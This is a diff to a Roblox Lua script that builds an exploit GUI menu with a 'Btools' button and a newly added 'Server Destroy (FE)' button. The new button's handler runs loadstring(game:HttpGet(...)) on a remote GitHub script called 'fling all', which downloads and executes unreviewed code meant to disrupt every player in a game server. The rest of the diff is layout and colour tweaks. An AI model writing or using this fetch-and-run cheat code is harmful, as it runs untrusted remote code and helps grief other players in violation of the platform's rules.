@@ -1,3 +1,8 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
 local ScreenGui = Instance.new("ScreenGui")
 local main = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
@@ -5,7 +10,9 @@ local UIGradient = Instance.new("UIGradient")
 local title = Instance.new("TextLabel")
 local btools = Instance.new("ImageButton")
 local btoolstext = Instance.new("TextLabel")
+local killall = Instance.new("TextButton")
 local close = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
 
 --Properties:
 
@@ -45,7 +52,7 @@ btools.Parent = main
 btools.BackgroundColor3 = Color3.fromRGB(71, 0, 1)
 btools.BorderColor3 = Color3.fromRGB(0, 0, 0)
 btools.BorderSizePixel = 0
-btools.Position = UDim2.new(0.0649819523, 0, 0.476923078, 0)
+btools.Position = UDim2.new(0.0722021684, 0, 0.704615414, 0)
 btools.Size = UDim2.new(0, 236, 0, 81)
 btools.Image = "http://www.roblox.com/asset/?id=14808588"
 btools.MouseButton1Down:connect(function()
@@ -58,7 +65,7 @@ btoolstext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 btoolstext.BackgroundTransparency = 1.000
 btoolstext.BorderColor3 = Color3.fromRGB(0, 0, 0)
 btoolstext.BorderSizePixel = 0
-btoolstext.Position = UDim2.new(0.0649819523, 0, 0.304615378, 0)
+btoolstext.Position = UDim2.new(0.0613718405, 0, 0.563076913, 0)
 btoolstext.Size = UDim2.new(0, 237, 0, 32)
 btoolstext.Font = Enum.Font.Unknown
 btoolstext.Text = "Btools (CLIENT):"
@@ -67,27 +74,46 @@ btoolstext.TextScaled = true
 btoolstext.TextSize = 40.000
 btoolstext.TextWrapped = true
 
+killall.Name = "killall"
+killall.Parent = main
+killall.BackgroundColor3 = Color3.fromRGB(71, 0, 1)
+killall.BorderColor3 = Color3.fromRGB(0, 0, 0)
+killall.BorderSizePixel = 0
+killall.Position = UDim2.new(0.0613718405, 0, 0.252307683, 0)
+killall.Size = UDim2.new(0, 236, 0, 89)
+killall.Font = Enum.Font.SourceSans
+killall.Text = "Server Destroy (FE)"
+killall.TextColor3 = Color3.fromRGB(255, 0, 4)
+killall.TextScaled = true
+killall.TextSize = 14.000
+killall.TextWrapped = true
+killall.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/g00bysmasher/fling/main/fling%20all',true))()
+end)
+
 close.Name = "close"
 close.Parent = main
-close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+close.BackgroundColor3 = Color3.fromRGB(79, 0, 1)
 close.BorderColor3 = Color3.fromRGB(0, 0, 0)
 close.BorderSizePixel = 0
-close.Position = UDim2.new(0.787003636, 0, 0.867692292, 0)
-close.Size = UDim2.new(0, 58, 0, 43)
+close.Position = UDim2.new(0.779783368, 0, -0.0984615386, 0)
+close.Size = UDim2.new(0, 61, 0, 42)
+close.ZIndex = 2
 close.Font = Enum.Font.SourceSans
 close.Text = "X"
-close.TextColor3 = Color3.fromRGB(255, 0, 4)
+close.TextColor3 = Color3.fromRGB(0, 0, 0)
 close.TextScaled = true
 close.TextSize = 14.000
-close.TextStrokeColor3 = Color3.fromRGB(255, 0, 4)
 close.TextWrapped = true
 close.MouseButton1Down:connect(function()
 	main.Visible = false
 end)
 
+UICorner_2.Parent = close
+
 -- Scripts:
 
-local function NXXWJ_fake_script() -- main.Dragify 
+local function KNELT_fake_script() -- main.Dragify 
 	local script = Instance.new('LocalScript', main)
 
 	local userInputService : UserInputService = game:GetService("UserInputService") -- UserInputService
@@ -136,4 +162,4 @@ local function NXXWJ_fake_script() -- main.Dragify
 	
 	
 end
-coroutine.wrap(NXXWJ_fake_script)()
+coroutine.wrap(KNELT_fake_script)()
